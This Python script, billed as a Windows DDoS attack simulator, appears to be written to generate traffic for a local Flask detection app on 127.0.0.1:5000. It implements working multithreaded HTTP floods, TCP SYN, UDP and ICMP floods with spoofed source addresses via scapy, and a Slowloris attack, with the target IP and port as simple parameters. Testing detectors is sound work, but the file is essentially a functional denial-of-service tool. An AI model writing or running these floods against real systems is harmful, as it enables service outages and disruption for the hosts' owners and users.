#!/usr/bin/env python3
"""
Windows-Compatible DDoS Attack Simulator
Modified to generate actual HTTP traffic that the Flask app can detect
"""

import socket
import threading
import time
import random
import os
import sys
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Windows-specific imports and configuration
try:
    from scapy.all import *
    conf.use_pcap = True  # Force use of pcap on Windows
except ImportError:
    print("Scapy not installed. Run: pip install scapy")
    sys.exit(1)

class WindowsDDoSSimulator:
    def __init__(self, target_ip="127.0.0.1", target_port=5000, num_threads=50):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.running = False
        self.target_url = f"http://{target_ip}:{target_port}/"
        
        # Get local IP automatically
        try:
            self.local_ip = socket.gethostbyname(socket.gethostname())
            print(f"Local IP: {self.local_ip}")
        except:
            self.local_ip = "192.168.1.100"
    
    def check_permissions(self):
        """Check if running with administrator privileges"""
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def http_flood_realistic(self):
        """HTTP flood that generates real traffic the Flask app can see"""
        session = requests.Session()
        # Disable retries to make requests fail fast
        session.mount("http://", HTTPAdapter(max_retries=0))
        
        while self.running:
            try:
                # Make rapid HTTP requests
                response = session.get(self.target_url, timeout=0.1)
            except:
                # Ignore connection errors - we want to overwhelm the server
                pass
            
            # Small delay to prevent completely overwhelming the system
            time.sleep(0.001)  # 1ms delay = ~1000 requests per second per thread
    
    def tcp_flood_with_http(self):
        """Combined TCP SYN flood with HTTP requests"""
        session = requests.Session()
        session.mount("http://", HTTPAdapter(max_retries=0))
        
        while self.running:
            try:
                # Send raw SYN packets (your original approach)
                src_ip = f"192.168.1.{random.randint(10, 200)}"
                src_port = random.randint(1024, 65535)
                
                packet = IP(src=src_ip, dst=self.target_ip) / \
                        TCP(sport=src_port, dport=self.target_port, flags="S")
                
                try:
                    send(packet, verbose=0)
                except OSError:
                    pass
                
                # Also make HTTP requests to generate detectable traffic
                if random.random() < 0.1:  # 10% of the time, make HTTP request
                    try:
                        session.get(self.target_url, timeout=0.1)
                    except:
                        pass
                        
            except Exception:
                pass
                
            time.sleep(0.001)
    
    def udp_flood_windows(self):
        """Windows-compatible UDP Flood"""
        while self.running:
            try:
                src_ip = f"192.168.1.{random.randint(10, 200)}"
                src_port = random.randint(1024, 65535)
                
                # Smaller payload for Windows
                payload = os.urandom(random.randint(32, 512))
                packet = IP(src=src_ip, dst=self.target_ip) / \
                        UDP(sport=src_port, dport=self.target_port) / payload
                
                try:
                    send(packet, verbose=0)
                except OSError:
                    continue
                    
                time.sleep(0.01)
                
            except Exception as e:
                print(f"Error in UDP flood: {e}")
                time.sleep(1)
                continue
    
    def icmp_flood_windows(self):
        """Windows-compatible ICMP Flood"""
        while self.running:
            try:
                src_ip = f"192.168.1.{random.randint(10, 200)}"
                
                packet = IP(src=src_ip, dst=self.target_ip) / ICMP()
                
                try:
                    send(packet, verbose=0)
                except OSError:
                    continue
                    
                time.sleep(0.01)
                
            except Exception as e:
                print(f"Error in ICMP flood: {e}")
                time.sleep(1)
                continue
    
    def slowloris_attack(self):
        """Slowloris-style attack that keeps connections open"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                
                # Send partial HTTP request
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {self.target_ip}\r\n".encode())
                
                # Keep connection alive by sending headers slowly
                for i in range(100):
                    if not self.running:
                        break
                    try:
                        sock.send(f"X-a{i}: {i}\r\n".encode())
                        time.sleep(1)
                    except:
                        break
                
                sock.close()
                
            except Exception:
                time.sleep(0.1)
                continue
    
    def start_attack_windows(self, attack_type="http", duration=30):
        """Start Windows-compatible attack"""
        
        print(f"Starting {attack_type.upper()} DDoS simulation (Windows)")
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Duration: {duration} seconds")
        print(f"Threads: {self.num_threads}")
        
        self.running = True
        threads = []
        
        # Choose attack method
        attack_methods = {
            "http": self.http_flood_realistic,
            "tcp": self.tcp_flood_with_http,
            "udp": self.udp_flood_windows,
            "icmp": self.icmp_flood_windows,
            "slowloris": self.slowloris_attack
        }
        
        if attack_type.lower() not in attack_methods:
            print("Invalid attack type. Use 'http', 'tcp', 'udp', 'icmp', or 'slowloris'")
            return
        
        attack_method = attack_methods[attack_type.lower()]
        
        # Start threads
        print("Starting attack threads...")
        for i in range(self.num_threads):
            thread = threading.Thread(target=attack_method, daemon=True)
            thread.start()
            threads.append(thread)
            time.sleep(0.01)  # Small delay between thread starts
        
        print(f"All {self.num_threads} threads started")
        
        # Run for specified duration
        try:
            for remaining in range(duration, 0, -1):
                print(f"\rAttack running... {remaining}s remaining", end="", flush=True)
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nAttack interrupted by user")
        
        # Stop attack
        self.running = False
        print(f"\n{attack_type.upper()} DDoS simulation completed")
        
        # Wait a moment for threads to finish
        time.sleep(2)

def main():
    print("=== Windows DDoS Attack Simulator (HTTP Traffic) ===")
    
    # Configuration for Windows
    TARGET_IP = "127.0.0.1"  # Localhost
    TARGET_PORT = 5000
    NUM_THREADS = 50  # Increased for HTTP flood
    DURATION = 30  # seconds
    
    # Create simulator
    ddos = WindowsDDoSSimulator(TARGET_IP, TARGET_PORT, NUM_THREADS)
    
    # Test connectivity to Flask app
    print("Testing Flask app connectivity...")
    try:
        response = requests.get(f"http://{TARGET_IP}:{TARGET_PORT}/", timeout=5)
        print(f"✓ Flask app is running and accessible")
        print(f"Response status: {response.status_code}")
    except Exception as e:
        print(f"✗ Cannot connect to Flask app: {e}")
        print("Make sure your Flask app is running on port 5000!")
        return
    
    # Run attacks
    print("\nStarting attack sequence...")
    
    # HTTP Flood (most detectable by your app)
    print("\n=== HTTP FLOOD ATTACK ===")
    ddos.start_attack_windows("http", DURATION)
    time.sleep(5)
    
    # TCP SYN Flood with HTTP
    print("\n=== TCP + HTTP ATTACK ===")
    ddos.start_attack_windows("tcp", DURATION)
    time.sleep(5)
    
    # Slowloris attack
    print("\n=== SLOWLORIS ATTACK ===")
    ddos.start_attack_windows("slowloris", DURATION)
    
    print("\nAll attacks completed!")

if __name__ == "__main__":
    main()